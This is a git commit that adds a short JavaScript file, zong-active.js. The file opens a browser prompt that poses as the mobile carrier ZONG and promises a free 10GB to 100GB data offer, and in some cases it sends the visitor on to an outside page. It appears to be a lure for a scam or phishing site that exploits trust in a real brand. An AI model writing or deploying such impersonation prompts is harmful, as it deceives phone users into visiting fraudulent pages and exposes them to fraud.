db1f9efa0e46402e465db205bfb66aa852ac3053
ekpebok <muiznurudeen46@gmail.com>
2025-03-21 15:39:03 +0100

    Create zong-active.js

---
+++ zong-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 100GB'
+password=prompt('ZONG: Dear customer, please check if your SIM card is eligible to receive a special offer of 10GB - 100GB. Press OK to check now..','ACTIVATE 100GB');
+if (password != 'ACTIVATE 100GB') {
+location.href='https://demobest.org/zong.html';
+}
